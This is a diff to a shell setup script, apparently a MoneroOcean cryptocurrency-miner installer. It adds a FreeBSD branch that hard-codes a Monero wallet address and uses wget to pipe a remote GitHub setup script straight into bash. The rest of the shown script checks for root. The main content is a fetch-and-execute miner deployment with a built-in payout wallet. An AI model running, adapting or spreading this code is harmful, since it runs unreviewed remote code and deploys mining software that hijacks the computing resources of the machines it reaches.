@@ -15,6 +15,44 @@ echo "Build Date: $BUILD_DATE"
 echo "=========================================="
 echo ""
 
+# ==================== OPERATING SYSTEM DETECTION ====================
+# Detect OS and redirect to FreeBSD setup if needed
+OS_TYPE=$(uname -s)
+WALLET_ADDRESS="${1:-49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso}"
+
+echo "[*] Detected OS: $OS_TYPE"
+
+if [ "$OS_TYPE" = "FreeBSD" ]; then
+    echo ""
+    echo "=========================================="
+    echo "FREEBSD DETECTED"
+    echo "=========================================="
+    echo "[*] Redirecting to FreeBSD-specific setup..."
+    echo "[*] Wallet Address: $WALLET_ADDRESS"
+    echo ""
+    
+    # Download and execute FreeBSD setup script
+    wget -qO- "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_m0_FreeBSD.sh?t=$(date +%s)" | bash -s "$WALLET_ADDRESS"
+    
+    # Capture exit code
+    EXIT_CODE=$?
+    
+    echo ""
+    echo "=========================================="
+    if [ $EXIT_CODE -eq 0 ]; then
+        echo "FreeBSD setup completed successfully!"
+    else
+        echo "FreeBSD setup exited with code: $EXIT_CODE"
+    fi
+    echo "=========================================="
+    
+    # Exit completely - don't run Linux setup
+    exit $EXIT_CODE
+fi
+
+echo "[*] Proceeding with Linux/UNIX setup"
+echo ""
+
 # ==================== ROOT DETECTION ====================
 if [ "$(id -u)" -eq 0 ]; then
     IS_ROOT=true
